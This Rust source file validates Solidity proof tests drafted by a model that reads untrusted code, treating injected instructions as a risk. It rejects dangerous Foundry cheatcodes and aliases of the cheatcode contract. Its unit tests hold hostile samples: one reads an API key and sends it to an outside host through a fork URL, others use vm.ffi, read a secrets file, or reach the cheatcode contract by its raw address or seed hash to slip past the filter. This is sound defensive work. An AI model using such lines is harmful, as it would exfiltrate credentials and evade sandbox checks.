//! The drafter's answer: claims and the test file that decides them.
//!
//! A draft is written by a model that read strangers' source code and, in ask mode, a stranger's
//! question. Either could carry instructions. The test file runs on our machine, so before it
//! runs it is checked against what a proof test may do: no file access, no foreign processes, no
//! environment beyond the chain endpoint, no fork of any endpoint but ours.

use kea_core::Claim;
use regex::Regex;
use serde::Deserialize;
use serde_json::{Value, json};
use std::sync::LazyLock;

/// What the drafter returns.
#[derive(Clone, Debug, Deserialize)]
pub struct Draft {
    /// The family the drafter sees the contract as (vault, token, pool, ...).
    pub kind: String,
    /// The claims, each tied to its check.
    pub claims: Vec<Claim>,
    /// The Foundry + halmos test file.
    pub test_sol: String,
}

/// The JSON schema of a draft, for structured outputs. Every object closes its properties and
/// lists them all as required; a claim without a replay sends an empty string.
pub fn schema() -> Value {
    let text = json!({"type": "string"});
    json!({
        "type": "object",
        "additionalProperties": false,
        "required": ["kind", "claims", "test_sol"],
        "properties": {
            "kind": text,
            "test_sol": text,
            "claims": {
                "type": "array",
                "items": {
                    "type": "object",
                    "additionalProperties": false,
                    "required": ["id", "plain", "expect", "check", "scope", "replay", "note"],
                    "properties": {
                        "id": text, "plain": text, "expect": {"type": "string", "enum": ["hold", "power"]},
                        "check": text, "scope": text, "replay": text, "note": text
                    }
                }
            }
        }
    })
}

/// Cheatcodes a proof test never needs, and that could read secrets, touch files, run programs or
/// talk to endpoints other than the chain.
static FORBIDDEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"\bvm\s*\.\s*(ffi|tryFfi|readFile|readFileBinary|readLine|writeFile|writeFileBinary|writeLine|closeFile|removeFile|copyFile|createDir|removeDir|readDir|readLink|fsMetadata|exists|isFile|isDir|projectRoot|unixTime|setEnv|envOr|envUint|envInt|envAddress|envBool|envBytes32|envBytes|envExists|rpc|rpcUrl|rpcUrls|rpcUrlStructs|createFork|selectFork|rollFork|makePersistent|startBroadcast|broadcast|serializeJson|writeJson|writeToml|parseJsonKeys|prompt|promptSecret|promptAddress|promptUint|sleep|transact|httpGet|httpPost)\s*\(",
    )
    .expect("static pattern")
});

/// The cheatcode contract under another name: a type cast, a variable of type `Vm`, forge-std's
/// address constants, or `address(vm)`. A draft has `vm` already, so another name can only be a way
/// around the checks above. `Vm.Log` and other types inside `Vm` stay allowed.
static VM_ALIAS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\bVm\s*\(|\bVm\s+(?:(?:internal|private|public|constant|immutable)\s+)*[A-Za-z_]\w*\s*[=;]|\bhevm\b|\b(?:VM_ADDRESS|HEVM_ADDRESS|CHEATCODE_ADDRESS)\b|\baddress\s*\(\s*vm\s*\)")
        .expect("static pattern")
});

/// The cheatcode contract's address and the seed it is derived from, matched without case.
const VM_ADDRESS_TEXT: [&str; 2] = ["7109709ecfa91a80626ff3989d68f67f5b1dd12d", "hevm cheat code"];

/// Environment reads: only the chain endpoint is allowed.
static ENV_READ: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bvm\s*\.\s*envString\s*\(\s*([^)]*)\)").expect("static pattern"));

/// Forks: only of the chain endpoint.
static FORK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bvm\s*\.\s*createSelectFork\s*\(([^;]*)\)\s*;").expect("static pattern"));

const CHAIN_ENDPOINT: &str = r#""RH_RPC""#;

impl Draft {
    /// Reads a draft from the drafter's JSON answer.
    ///
    /// # Errors
    /// When the answer is not a draft.
    pub fn parse(text: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(text)
    }

    /// What is wrong with the draft before anything runs. Empty when it may run.
    pub fn problems(&self) -> Vec<String> {
        let mut problems = Vec::new();
        let test = &self.test_sol;
        if !test.contains("contract ProofTest") {
            problems.push("the test contract must be named ProofTest".to_string());
        }
        for found in FORBIDDEN.captures_iter(test) {
            problems.push(format!("vm.{} is not allowed in a proof test", &found[1]));
        }
        let lower = test.to_lowercase();
        if VM_ALIAS.is_match(test) || VM_ADDRESS_TEXT.iter().any(|text| lower.contains(text)) {
            problems.push("the cheatcode contract may only be used as vm".to_string());
        }
        for found in ENV_READ.captures_iter(test) {
            if found[1].trim() != CHAIN_ENDPOINT {
                problems.push("vm.envString may only read \"RH_RPC\"".to_string());
            }
        }
        for found in FORK.captures_iter(test) {
            let argument: String = found[1].chars().filter(|c| !c.is_whitespace()).collect();
            if argument != r#"vm.envString("RH_RPC")"# {
                problems.push("forks must be made with vm.createSelectFork(vm.envString(\"RH_RPC\"))".to_string());
            }
        }
        let mut seen = std::collections::BTreeSet::new();
        for claim in &self.claims {
            if !seen.insert(claim.id.as_str()) {
                problems.push(format!("claim id {} is used twice", claim.id));
            }
            if !defines(test, &claim.check) {
                problems
                    .push(format!("claim {} names check {} but the file has no such function", claim.id, claim.check));
            }
            if let Some(replay) = claim.replay.as_deref().filter(|replay| !replay.is_empty())
                && !defines(test, replay)
            {
                problems.push(format!("claim {} names replay {replay} but the file has no such function", claim.id));
            }
        }
        problems.dedup();
        problems
    }
}

fn defines(test: &str, function: &str) -> bool {
    Regex::new(&format!(r"\bfunction\s+{}\s*\(", regex::escape(function))).is_ok_and(|head| head.is_match(test))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn draft(test: &str) -> Draft {
        Draft::parse(
            &json!({
                "kind": "vault",
                "test_sol": test,
                "claims": [
                    {"id": "V1_withdraw", "plain": "A depositor can always withdraw", "expect": "hold",
                     "check": "check_V1_withdraw", "scope": "any", "replay": "", "note": ""},
                    {"id": "O1_pause", "plain": "The owner can pause withdrawals", "expect": "power",
                     "check": "check_O1_pause", "scope": "pause", "replay": "test_replay_O1_pause", "note": ""}
                ]
            })
            .to_string(),
        )
        .unwrap()
    }

    const GOOD: &str = "contract ProofTest is Test, SymTest {\n\
        function check_V1_withdraw() public {}\n\
        function check_O1_pause() public {}\n\
        function test_replay_O1_pause() public { vm.createSelectFork(vm.envString(\"RH_RPC\")); }\n}";

    #[test]
    fn a_proper_draft_has_no_problems() {
        assert!(draft(GOOD).problems().is_empty(), "{:?}", draft(GOOD).problems());
    }

    #[test]
    fn missing_functions_are_named() {
        let problems = draft("contract ProofTest {\nfunction check_V1_withdraw() public {}\n}").problems();
        assert_eq!(problems.len(), 2);
        assert!(problems[0].contains("check_O1_pause"));
        assert!(problems[1].contains("test_replay_O1_pause"));
    }

    #[test]
    fn hostile_cheatcodes_are_refused() {
        for hostile in [
            "string memory k = vm.envString(\"ANTHROPIC_API_KEY\");",
            "vm.createSelectFork(string.concat(\"https://x.example/\", k));",
            "vm.ffi(cmd);",
            "vm.readFile(\"/etc/kea/kea.env\");",
            "vm . rpc(\"eth_call\", p);",
            "vm.envOr(\"X\", uint256(1));",
            "Vm(address(vm)).createFork(\"https://x.example\");",
            "Vm cheats = vm; cheats.rpcUrl(\"x\");",
            "hevm.createSelectFork(\"https://x.example\");",
            "ICheat(VM_ADDRESS).createFork(\"https://x.example\");",
            "ICheat(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D).ffi(c);",
            "ICheat(address(uint160(uint256(keccak256(\"hevm cheat code\"))))).ffi(c);",
        ] {
            let test = GOOD.replace(
                "function check_V1_withdraw() public {}",
                &format!("function check_V1_withdraw() public {{ {hostile} }}"),
            );
            assert!(!draft(&test).problems().is_empty(), "allowed: {hostile}");
        }
    }

    #[test]
    fn recorded_logs_may_use_the_vm_types() {
        let test = GOOD.replace(
            "function check_V1_withdraw() public {}",
            "function check_V1_withdraw() public { Vm.Log[] memory logs = vm.getRecordedLogs(); logs; }",
        );
        assert!(draft(&test).problems().is_empty(), "{:?}", draft(&test).problems());
    }

    #[test]
    fn the_schema_closes_every_object() {
        let schema = schema();
        assert_eq!(schema["additionalProperties"], false);
        assert_eq!(schema["properties"]["claims"]["items"]["additionalProperties"], false);
        let required = schema["properties"]["claims"]["items"]["required"].as_array().unwrap().len();
        let properties = schema["properties"]["claims"]["items"]["properties"].as_object().unwrap().len();
        assert_eq!(required, properties);
    }
}
